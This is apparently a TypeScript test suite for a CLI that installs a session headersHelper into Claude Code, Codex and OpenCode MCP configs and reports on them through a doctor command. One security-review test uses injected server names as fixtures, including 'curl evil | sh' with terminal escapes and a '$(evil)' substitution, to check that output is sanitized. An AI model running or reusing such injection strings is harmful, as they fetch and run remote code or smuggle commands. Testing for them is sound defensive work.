// #2688: the helper goes on every Claude entry for the instance (user and local
// scope), is re-applied when the daemon starts, and doctor says when an entry
// can't be linked. Everything runs in a throwaway home with stubbed exec.
import { EventEmitter } from "node:events";
import {
  copyFileSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  statSync,
  symlinkSync,
  utimesSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { setStaged, writeState } from "@oa/bus-daemon";
import { describe, expect, it, vi } from "vitest";
import { daemon } from "../src/commands/daemon.ts";
import { doctor } from "../src/commands/doctor.ts";
import { update } from "../src/commands/update.ts";
import {
  type AdapterDeps,
  installAdapters,
  uninstallAdapters,
} from "../src/steps/adapters.ts";
import { installProof, isProofHelper } from "../src/steps/claude-proof.ts";
import { claudeProofChecks } from "../src/steps/claude-proof-check.ts";
import { fakeCtx, TOKEN } from "./fake.ts";

const HUB = "https://oa.example.com";
const BIN = "/usr/local/bin/oa-bus";
const TOKEN_FILE = "~/.open-artifacts/oa-example-com-pat-token";
const TOKEN_HELPER = `T=$(cat ${TOKEN_FILE}) && printf '{"Authorization":"Bearer %s"}' "$T"`;
const PROJ_A = "/work/a";
const PROJ_B = "/work/b";
const http = (url = `${HUB}/mcp`, extra: object = {}) => ({
  type: "http",
  url,
  ...extra,
});

const claudeJson = (over: object = {}) =>
  JSON.stringify(
    {
      numStartups: 3,
      mcpServers: { "open-artifacts": http(), other: { type: "stdio" } },
      projects: {
        [PROJ_A]: { allowedTools: [], mcpServers: { oa: http(`${HUB}/mcp/`) } },
        [PROJ_B]: { mcpServers: { unrelated: http("https://x.test/mcp") } },
      },
      ...over,
    },
    null,
    2,
  );

const setup = (json: string | null = claudeJson()) => {
  const h = mkdtempSync(join(tmpdir(), "ob-proof-2688-"));
  const file = join(h, ".claude.json");
  if (json !== null) writeFileSync(file, json);
  const deps: AdapterDeps = {
    home: h,
    env: {},
    hub: HUB,
    busBin: [BIN],
    assets: { pi: "PI", opencodePlugin: "JS" },
    which: (c) => c === "claude",
    exec: async () => ({ code: 0, stdout: "", stderr: "" }),
  };
  const read = () => JSON.parse(readFileSync(file, "utf8"));
  return { h, file, deps, read, text: () => readFileSync(file, "utf8") };
};
const helpers = (doc: {
  mcpServers: Record<string, { headersHelper?: string }>;
  projects: Record<
    string,
    { mcpServers: Record<string, { headersHelper?: string }> }
  >;
}) => ({
  user: doc.mcpServers["open-artifacts"]?.headersHelper,
  a: doc.projects[PROJ_A]?.mcpServers.oa?.headersHelper,
  b: doc.projects[PROJ_B]?.mcpServers.unrelated?.headersHelper,
});

describe("install and uninstall, every scope in ~/.claude.json", () => {
  it("adds the helper at user and local scope (a trailing slash too), and uninstall restores the bytes", async () => {
    const s = setup();
    const original = s.text();
    await installAdapters(s.deps);
    const h = helpers(s.read());
    expect(h.user).toBe(`${BIN} mcp-proof`);
    expect(h.a).toBe(`${BIN} mcp-proof`);
    // Another host's entry, other keys and the stdio entry are untouched.
    expect(h.b).toBeUndefined();
    expect(s.read().numStartups).toBe(3);
    expect(s.read().mcpServers.other).toEqual({ type: "stdio" });
    await uninstallAdapters(s.deps);
    expect(s.text()).toBe(original);
  });

  it("keeps a token helper's Authorization, and leaves a foreign helper alone with a note", async () => {
    const s = setup(
      claudeJson({
        mcpServers: { tok: http(undefined, { headersHelper: TOKEN_HELPER }) },
        projects: {
          [PROJ_A]: {
            mcpServers: { mine: http(undefined, { headersHelper: "my-own" }) },
          },
        },
      }),
    );
    const original = s.text();
    const r = await installAdapters(s.deps);
    const doc = s.read();
    expect(doc.mcpServers.tok.headersHelper).toContain(
      "mcp-proof --token-file",
    );
    expect(doc.mcpServers.tok.headersHelper).toContain(TOKEN_FILE);
    expect(doc.projects[PROJ_A].mcpServers.mine.headersHelper).toBe("my-own");
    expect(JSON.stringify(r)).toContain("left the headersHelper of mine");
    await uninstallAdapters(s.deps);
    expect(s.text()).toBe(original);
  });

  it("a second install writes nothing", async () => {
    const s = setup();
    await installAdapters(s.deps);
    const once = s.text();
    const rec = readFileSync(join(s.h, ".oa-bus/install.json"), "utf8");
    await installAdapters(s.deps);
    expect(s.text()).toBe(once);
    expect(readFileSync(join(s.h, ".oa-bus/install.json"), "utf8")).toBe(rec);
  });

  it("never edits a project-scope .mcp.json", async () => {
    const s = setup();
    const proj = join(s.h, ".mcp.json");
    const body = JSON.stringify({ mcpServers: { oa: http() } });
    writeFileSync(proj, body);
    await installAdapters(s.deps);
    expect(readFileSync(proj, "utf8")).toBe(body);
  });
});

describe("daemon start re-applies the helper", () => {
  const start = async (
    ctx: ReturnType<typeof fakeCtx>,
  ): Promise<ReturnType<typeof vi.fn>> => {
    const signals = new EventEmitter() as never;
    const run = vi.fn(async () => ({ stop: async () => {} }) as never);
    const done = daemon(ctx, run as never, signals);
    await vi.waitFor(() => expect(run).toHaveBeenCalled());
    (signals as unknown as EventEmitter).emit("SIGTERM");
    await done;
    return run;
  };
  const ctxFor = (s: ReturnType<typeof setup>) => {
    const ctx = fakeCtx({
      userHome: s.h,
      home: join(s.h, ".oa-bus"),
      env: {},
      service: {
        ensure: async () => ({}),
        remove: async () => ({}),
        cli: () => [BIN],
        argv: () => [BIN],
      },
    });
    mkdirSync(ctx.home, { recursive: true });
    writeFileSync(
      join(ctx.home, "machine.json"),
      JSON.stringify({
        hub: HUB,
        machine_id: "m",
        label: "l",
        machine_token: TOKEN,
      }),
    );
    return ctx;
  };

  it("gives a late-added entry the helper, logs name and scope only, and then writes nothing", async () => {
    const s = setup();
    await installAdapters(s.deps);
    // Added after install, at local scope and at user scope.
    const doc = s.read();
    doc.projects[PROJ_B].mcpServers.late = http();
    doc.mcpServers.late2 = http(`${HUB}/mcp/`);
    writeFileSync(s.file, JSON.stringify(doc, null, 2));
    const ctx = ctxFor(s);
    await start(ctx);
    const after = s.read();
    expect(after.projects[PROJ_B].mcpServers.late.headersHelper).toBe(
      `${BIN} mcp-proof`,
    );
    expect(after.mcpServers.late2.headersHelper).toBe(`${BIN} mcp-proof`);
    // Nothing else changed.
    expect(after.projects[PROJ_B].mcpServers.unrelated).toEqual(
      doc.projects[PROJ_B].mcpServers.unrelated,
    );
    const logFile = join(ctx.home, "logs/events.log");
    await vi.waitFor(() =>
      expect(readFileSync(logFile, "utf8")).toContain("late2"),
    );
    const log = readFileSync(logFile, "utf8");
    expect(log).toMatch(/claude_proof_applied name=late kind=local/);
    expect(log).toMatch(/claude_proof_applied name=late2 kind=user/);
    expect(log).not.toContain("mcp-proof");
    expect(log).not.toContain(PROJ_B);
    // A second start: no write at all.
    const bytes = s.text();
    // Age the file, so a rewrite would show in its mtime without any wait.
    const aged = new Date(Date.now() - 60_000);
    utimesSync(s.file, aged, aged);
    const mtime = statSync(s.file).mtimeMs;
    await start(ctx);
    expect(s.text()).toBe(bytes);
    expect(statSync(s.file).mtimeMs).toBe(mtime);
    // Uninstall takes the late entries' helpers off too.
    await uninstallAdapters(s.deps);
    expect(JSON.stringify(s.read())).not.toContain("mcp-proof");
  });

  it("refreshes a helper whose command line changed, and leaves a foreign helper and other hosts alone", async () => {
    const s = setup(
      claudeJson({
        projects: {
          [PROJ_A]: {
            mcpServers: { mine: http(undefined, { headersHelper: "my-own" }) },
          },
        },
      }),
    );
    await installAdapters(s.deps);
    const ctx = fakeCtx({
      ...ctxFor(s),
      service: {
        ensure: async () => ({}),
        remove: async () => ({}),
        cli: () => ["/new/oa-bus"],
        argv: () => ["/new/oa-bus"],
      },
    });
    await start(ctx);
    const doc = s.read();
    expect(doc.mcpServers["open-artifacts"].headersHelper).toBe(
      "/new/oa-bus mcp-proof",
    );
    expect(doc.projects[PROJ_A].mcpServers.mine.headersHelper).toBe("my-own");
  });

  it("edits only the Claude config install recorded, not a stale ~/.claude.json, and uninstall restores the token helper", async () => {
    const s = setup(null);
    const cfgDir = join(s.h, "cfg");
    mkdirSync(cfgDir, { recursive: true });
    const real = join(cfgDir, ".claude.json");
    const tok = (name: string) =>
      JSON.stringify({
        mcpServers: {
          [name]: http(undefined, { headersHelper: TOKEN_HELPER }),
        },
      });
    writeFileSync(real, tok("open-artifacts"));
    // A stale file under the home, with the same entry name.
    writeFileSync(s.file, tok("open-artifacts"));
    const deps = { ...s.deps, env: { CLAUDE_CONFIG_DIR: cfgDir } };
    await installAdapters(deps);
    expect(readFileSync(real, "utf8")).toContain("mcp-proof --token-file");
    expect(readFileSync(s.file, "utf8")).toBe(tok("open-artifacts"));
    // The daemon's own environment has no CLAUDE_CONFIG_DIR.
    await start(ctxFor(s));
    expect(readFileSync(s.file, "utf8")).toBe(tok("open-artifacts"));
    await uninstallAdapters(deps);
    expect(readFileSync(real, "utf8")).toBe(tok("open-artifacts"));
    expect(readFileSync(s.file, "utf8")).toBe(tok("open-artifacts"));
  });

  it("does nothing for a bus home the harness configs don't name, even with a copied record", async () => {
    const s = setup();
    await installAdapters(s.deps);
    const doc = s.read();
    doc.projects[PROJ_B].mcpServers.late = http();
    writeFileSync(s.file, JSON.stringify(doc, null, 2));
    const other = join(s.h, "other-bus");
    mkdirSync(other, { recursive: true });
    copyFileSync(
      join(s.h, ".oa-bus/install.json"),
      join(other, "install.json"),
    );
    const ctx = ctxFor(s);
    ctx.home = other;
    writeFileSync(
      join(other, "machine.json"),
      readFileSync(join(s.h, ".oa-bus/machine.json")),
    );
    const bytes = s.text();
    await start(ctx);
    expect(s.text()).toBe(bytes);
  });

  it("uses the hub's origin when machine.json holds a non-bare address", async () => {
    const s = setup();
    await installAdapters(s.deps);
    const doc = s.read();
    doc.projects[PROJ_B].mcpServers.late = http();
    writeFileSync(s.file, JSON.stringify(doc, null, 2));
    const ctx = ctxFor(s);
    writeFileSync(
      join(ctx.home, "machine.json"),
      JSON.stringify({
        hub: "wss://oa.example.com/bus/ws?x=1",
        machine_id: "m",
        label: "l",
        machine_token: TOKEN,
      }),
    );
    await start(ctx);
    expect(s.read().projects[PROJ_B].mcpServers.late.headersHelper).toBe(
      `${BIN} mcp-proof`,
    );
  });

  it("never writes through a symlinked config", async () => {
    const s = setup();
    await installAdapters(s.deps);
    const doc = s.read();
    doc.projects[PROJ_B].mcpServers.late = http();
    const real = join(s.h, "real.json");
    writeFileSync(real, JSON.stringify(doc, null, 2));
    rmSync(s.file);
    symlinkSync(real, s.file);
    await start(ctxFor(s));
    expect(readFileSync(real, "utf8")).toBe(JSON.stringify(doc, null, 2));
  });

  it("writes nothing when the file changed between the read and the write", () => {
    const s = setup();
    const write = vi.fn();
    const first = readFileSync(s.file, "utf8");
    let n = 0;
    const r = installProof(
      {
        file: s.file,
        record: join(s.h, "install.json"),
        write,
        // The second read, just before the write, sees Claude's own edit.
        read: () => (++n === 1 ? first : `${first}\n`),
      },
      HUB,
      [BIN],
      undefined,
      { guard: true },
    );
    expect(r.skipped).toBe(true);
    expect(r.changed).toEqual([]);
    expect(write).not.toHaveBeenCalled();
  });

  it("does nothing without a config file", async () => {
    const s = setup(null);
    await start(ctxFor(s));
    expect(() => readFileSync(s.file)).toThrow();
  });
});

describe("doctor, Claude entries (#2688)", () => {
  const lines = async (
    s: ReturnType<typeof setup>,
    cwdFile?: object,
    log?: string,
    cwdIn?: string,
  ) => {
    const cwd = cwdIn ?? mkdtempSync(join(tmpdir(), "ob-proof-cwd-"));
    if (cwdFile) writeFileSync(join(cwd, ".mcp.json"), JSON.stringify(cwdFile));
    const ctx = fakeCtx({
      userHome: s.h,
      home: join(s.h, ".oa-bus"),
      cwd,
      env: {},
      now: () => Date.parse("2026-11-18T00:00:00Z"),
      nodeVersion: "v22.11.0",
      which: (c) => c === "claude",
      exec: vi.fn(async () => ({ code: 0, stdout: "2.1.318", stderr: "" })),
    });
    mkdirSync(ctx.home, { recursive: true });
    writeFileSync(
      join(ctx.home, "machine.json"),
      JSON.stringify({
        hub: HUB,
        machine_id: "m",
        label: "l",
        machine_token: TOKEN,
      }),
    );
    if (log) {
      mkdirSync(join(ctx.home, "logs"), { recursive: true });
      writeFileSync(join(ctx.home, "logs/events.log"), log);
    }
    await doctor(ctx);
    return ctx
      .all()
      .filter((l) =>
        /^( {2}\S|Claude Code: |No Claude Code| {3}Agents using)/.test(l),
      );
  };

  it("passes for each entry that has the helper", async () => {
    const s = setup();
    await installAdapters(s.deps);
    const out = await lines(s);
    expect(out).toEqual([
      "Claude Code: the open-artifacts entry (user scope) shows as this session on pages.",
      "Claude Code: the oa entry (local scope, project /work/a) shows as this session on pages.",
    ]);
  });

  it("fails with the fix for an entry with no helper, and one with someone else's", async () => {
    const s = setup(
      claudeJson({
        projects: {
          [PROJ_A]: {
            mcpServers: { mine: http(undefined, { headersHelper: "my-own" }) },
          },
        },
      }),
    );
    const out = await lines(s);
    expect(out).toEqual([
      "Claude Code: the open-artifacts entry (user scope) has no session helper, so what it posts can't be tied to this session.",
      "  Fix: run npx @open-artifacts/bus install",
      "Claude Code: the mine entry (local scope, project /work/a) has a headersHelper that is not oa-bus's, so oa-bus left it alone.",
      expect.stringMatching(
        /^ {2}Fix: remove that headersHelper from the entry in .*\.claude\.json, then run .* install$/,
      ),
      "Claude Code: automatic linking is off for this bus.",
      "  Fix: run npx @open-artifacts/bus install once to turn it on",
    ]);
  });

  it("warns, not fails, for a project-scope entry, in words and with no command that edits .mcp.json", async () => {
    const s = setup(claudeJson({ projects: {} }));
    await installAdapters(s.deps);
    const out = await lines(s, { mcpServers: { "$(evil) x": http() } });
    expect(out).toEqual([
      "Claude Code: the open-artifacts entry (user scope) shows as this session on pages.",
      "Claude Code: the $(evil) x entry (project scope, .mcp.json in this folder) is not set up by the bus; it links only if it has our helper and the folder is trusted.",
      "  Re-add it at user scope with Claude Code, then run npx @open-artifacts/bus install.",
    ]);
    expect(out.join("\n")).not.toContain("claude mcp");
  });

  it("never prints control characters from a name or a token from an address (#2688 security review)", async () => {
    const s = setup(claudeJson({ projects: {} }));
    await installAdapters(s.deps);
    const out = await lines(s, {
      mcpServers: {
        "a\n  Fix: curl evil | sh\u001b[2K": http(),
        b: http(`${HUB}/x?token=SECRET123#frag`),
        c: http(`https://user:SECRET456@oa.example.com/y\n  Fix: run evil`),
      },
    });
    const text = out.join("\n");
    for (const l of out) expect(l).not.toMatch(/^\s*Fix: (curl|run evil)/);
    expect(text).not.toContain("\u001b");
    expect(text).not.toContain("SECRET123");
    expect(text).not.toContain("SECRET456");
    expect(text).not.toContain("frag");
    expect(text).toContain("the a?  Fix: curl evil | sh?[2K entry");
    expect(text).toContain(`points at ${HUB}/x, not`);
  });

  it("does not report a project entry that a same-name local entry for this folder shadows", async () => {
    const cwd = mkdtempSync(join(tmpdir(), "ob-proof-cwd-"));
    const s = setup(
      claudeJson({ projects: { [cwd]: { mcpServers: { oa: http() } } } }),
    );
    await installAdapters(s.deps);
    const out = await lines(s, { mcpServers: { oa: http() } }, undefined, cwd);
    expect(out.join("\n")).not.toContain("project scope");
  });

  it("warns for an entry with our helper in a folder Claude doesn't trust, and reads no flag as unknown", async () => {
    const s = setup(
      claudeJson({
        projects: {
          [PROJ_A]: {
            hasTrustDialogAccepted: false,
            mcpServers: { oa: http() },
          },
          [PROJ_B]: { mcpServers: { late: http() } },
        },
      }),
    );
    await installAdapters(s.deps);
    const out = await lines(s);
    expect(out).toContain(
      "Claude Code: the oa entry (local scope, project /work/a) has the helper, but Claude doesn't trust that folder yet, so it won't run it.",
    );
    expect(out).toContain(
      "Claude Code: the late entry (local scope, project /work/b) shows as this session on pages.",
    );
  });

  it("says, without counting it, when there is no entry at all; warns for the same host at another path", async () => {
    const none = await lines(
      setup(claudeJson({ mcpServers: {}, projects: {} })),
    );
    expect(none).toEqual([
      "No Claude Code entry for oa.example.com.",
      "   Agents using a connector or another client aren't checked.",
    ]);
    const other = await lines(
      setup(
        claudeJson({
          mcpServers: { x: http(`${HUB}/v2/mcp`) },
          projects: {},
        }),
      ),
    );
    expect(other).toContain(
      `Claude Code: the x entry (user scope) points at ${HUB}/v2/mcp, not ${HUB}/mcp, so it can't be linked.`,
    );
  });

  it("warns about an entry with our helper that no install recorded, and install adopts it", async () => {
    const own = `T=$(cat ${TOKEN_FILE}) && { ${BIN} mcp-proof --token-file ${TOKEN_FILE} 2>/dev/null || printf '{"Authorization":"Bearer %s"}' "$T"; }`;
    const s = setup(
      claudeJson({
        mcpServers: {
          "open-artifacts": http(undefined, { headersHelper: own }),
        },
        projects: {},
      }),
    );
    const before = await lines(s);
    expect(before).toEqual([
      "Claude Code: the open-artifacts entry (user scope) has the helper, but was set up by another bus or an older install.",
      "  Fix: run npx @open-artifacts/bus install to adopt it",
      "Claude Code: automatic linking is off for this bus.",
      "  Fix: run npx @open-artifacts/bus install once to turn it on",
    ]);
    await installAdapters(s.deps);
    expect((await lines(s))[0]).toContain("shows as this session");
    // The token form comes back on uninstall.
    await uninstallAdapters(s.deps);
    expect(s.read().mcpServers["open-artifacts"].headersHelper).toBe(
      TOKEN_HELPER,
    );
  });

  it("says when the Claude config is a symlink", async () => {
    const s = setup(null);
    const real = join(s.h, "real.json");
    writeFileSync(real, claudeJson());
    symlinkSync(real, s.file);
    const out = await lines(s);
    expect(out.join("\n")).toContain(
      "is a symlink, so the daemon doesn't edit it on its own.",
    );
  });

  it("shows what the last automatic fix changed, from the log", async () => {
    const s = setup();
    await installAdapters(s.deps);
    const out = await lines(
      s,
      undefined,
      "2026-11-17T08:00:00.000Z claude_proof_applied name=late kind=local\n",
    );
    expect(out).toContain(
      "Claude Code: the last automatic fix (2026-11-17 08:00 UTC) added the helper to late (local scope).",
    );
    // Older than a week: not shown.
    const old = await lines(
      s,
      undefined,
      "2020-01-01T08:00:00.000Z claude_proof_applied name=late kind=local\n",
    );
    expect(old.join("\n")).not.toContain("last automatic fix");
  });

  it("never prints a header value", async () => {
    const s = setup(
      claudeJson({
        mcpServers: { tok: http(undefined, { headersHelper: TOKEN_HELPER }) },
      }),
    );
    await installAdapters(s.deps);
    const out = (await lines(s)).join("\n");
    expect(out).not.toContain(TOKEN_FILE);
    expect(out).not.toContain("mcp-proof");
    expect(isProofHelper(s.read().mcpServers.tok.headersHelper)).toBe(true);
  });
});

describe("doctor, Codex and OpenCode entries the proxy swap skipped", () => {
  it("warns, by name, for an OAuth Codex entry and an OpenCode entry that signs in with auth", async () => {
    const h = mkdtempSync(join(tmpdir(), "ob-proof-2688-x-"));
    mkdirSync(join(h, ".codex"), { recursive: true });
    writeFileSync(
      join(h, ".codex/config.toml"),
      `[mcp_servers.oa-codex]\nurl = "${HUB}/mcp"\n`,
    );
    mkdirSync(join(h, ".config/opencode"), { recursive: true });
    writeFileSync(
      join(h, ".config/opencode/opencode.json"),
      JSON.stringify({
        mcp: { "oa-oc": { type: "remote", url: `${HUB}/mcp`, oauth: {} } },
      }),
    );
    const ctx = fakeCtx({
      userHome: h,
      home: join(h, ".oa-bus"),
      env: {},
      nodeVersion: "v22.11.0",
      which: (c) => c === "codex" || c === "opencode",
      exec: vi.fn(async (cmd: string) => ({
        code: 0,
        stdout: cmd === "opencode" ? "2.1.0" : "codex-cli 0.167.0",
        stderr: "",
      })),
    });
    mkdirSync(ctx.home, { recursive: true });
    writeFileSync(
      join(ctx.home, "machine.json"),
      JSON.stringify({
        hub: HUB,
        machine_id: "m",
        label: "l",
        machine_token: TOKEN,
      }),
    );
    await doctor(ctx);
    const all = ctx.all().join("\n");
    expect(all).toContain("Codex: left the oa-codex entry");
    expect(all).toContain("OpenCode: left the oa-oc entry");
  });
});

describe("two buses on one hub (#2688)", () => {
  it("each leaves the other's helper alone: no flip on daemon start, and each uninstall touches only its own", async () => {
    const s = setup();
    const original = s.text();
    const alt = join(s.h, "alt");
    const altDeps: AdapterDeps = { ...s.deps, busHome: alt };
    await installAdapters(s.deps);
    const main = s.text();
    const r = await installAdapters(altDeps);
    // Alt finds main's helper on the entry and leaves it.
    expect(JSON.stringify(r.notes)).toContain("belongs to the bus at");
    expect(s.text()).toBe(main);
    // Each daemon start: the unattended path changes nothing on the other's helper.
    const altIo = {
      file: s.file,
      record: join(alt, "install.json"),
      write: () => {
        throw new Error("alt wrote");
      },
    };
    expect(
      installProof(altIo, HUB, [BIN], alt, { guard: true }).changed,
    ).toEqual([]);
    expect(s.text()).toBe(main);
    // Alt's uninstall does not strip main's helper.
    await uninstallAdapters(altDeps);
    expect(s.text()).toBe(main);
    await uninstallAdapters(s.deps);
    expect(s.text()).toBe(original);
  });

  it("doctor names the home that owns the helper", async () => {
    const s = setup();
    await installAdapters(s.deps);
    const alt = join(s.h, "alt");
    const ctx = fakeCtx({ userHome: s.h, home: alt, env: {} });
    const out = claudeProofChecks(ctx, HUB);
    expect(out[0]?.lines[0]).toContain(
      "has the helper of another bus (the default home), so this bus left it alone.",
    );
    // From the default bus the same entries pass.
    expect(
      claudeProofChecks(
        fakeCtx({ userHome: s.h, home: join(s.h, ".oa-bus"), env: {} }),
        HUB,
      )[0]?.level,
    ).toBe("pass");
  });
});

describe("trust, symlinks and existing installs (#2688)", () => {
  it("a parent folder's trust does not count; only the exact folder", async () => {
    const s = setup(
      claudeJson({
        projects: {
          "/work": { hasTrustDialogAccepted: true },
          [PROJ_A]: {
            hasTrustDialogAccepted: false,
            mcpServers: { oa: http() },
          },
          [PROJ_B]: { mcpServers: { late: http() } },
        },
      }),
    );
    await installAdapters(s.deps);
    const ctx = fakeCtx({ userHome: s.h, home: join(s.h, ".oa-bus"), env: {} });
    const out = claudeProofChecks(ctx, HUB);
    expect(out.map((c) => c.level)).toContain("warn");
    expect(out.flatMap((c) => c.lines).join("\n")).toContain(
      "the oa entry (local scope, project /work/a) has the helper, but Claude doesn't trust that folder",
    );
  });

  it("install writes through a symlinked ~/.claude.json and keeps the link", async () => {
    const s = setup(null);
    const real = join(s.h, "real.json");
    writeFileSync(real, claudeJson());
    symlinkSync(real, s.file);
    await installAdapters(s.deps);
    expect(lstatSync(s.file).isSymbolicLink()).toBe(true);
    expect(readFileSync(real, "utf8")).toContain("mcp-proof");
  });

  it("records the config file even before it exists, so a later file is picked up by the daemon", async () => {
    const s = setup(null);
    await installAdapters(s.deps);
    expect(
      JSON.parse(readFileSync(join(s.h, ".oa-bus/install.json"), "utf8"))
        .claudeConfig,
    ).toBe(s.file);
    writeFileSync(s.file, claudeJson());
    const ctx = fakeCtx({
      userHome: s.h,
      home: join(s.h, ".oa-bus"),
      env: {},
      service: {
        ensure: async () => ({}),
        remove: async () => ({}),
        cli: () => [BIN],
        argv: () => [BIN],
      },
    });
    writeFileSync(
      join(ctx.home, "machine.json"),
      JSON.stringify({
        hub: HUB,
        machine_id: "m",
        label: "l",
        machine_token: TOKEN,
      }),
    );
    const signals = new EventEmitter() as never;
    const run = vi.fn(async () => ({ stop: async () => {} }) as never);
    const done = daemon(ctx, run as never, signals);
    await vi.waitFor(() => expect(run).toHaveBeenCalled());
    (signals as unknown as EventEmitter).emit("SIGTERM");
    await done;
    expect(s.read().mcpServers["open-artifacts"].headersHelper).toBe(
      `${BIN} mcp-proof`,
    );
  });

  it("oa-bus update records the config and links an install made before it was recorded", async () => {
    const s = setup();
    const ctx = fakeCtx(
      {
        userHome: s.h,
        home: join(s.h, ".oa-bus"),
        env: {},
        which: (c) => c === "claude",
        service: {
          ensure: async () => ({}),
          remove: async () => ({}),
          cli: () => [BIN],
          argv: () => [BIN],
        },
      },
      true,
    );
    mkdirSync(ctx.home, { recursive: true });
    writeState(ctx.home, { armed: true });
    setStaged(ctx.home, "1.6.0", 1);
    ctx.stdinIsTTY = true;
    ctx.readLine = vi.fn(async () => "yes");
    writeFileSync(
      join(ctx.home, "machine.json"),
      JSON.stringify({
        hub: HUB,
        machine_id: "m",
        label: "l",
        machine_token: TOKEN,
      }),
    );
    expect(await update(ctx, async () => true)).toBe(0);
    expect(
      JSON.parse(readFileSync(join(ctx.home, "install.json"), "utf8"))
        .claudeConfig,
    ).toBe(s.file);
    expect(s.read().mcpServers["open-artifacts"].headersHelper).toBe(
      `${BIN} mcp-proof`,
    );
  });
});
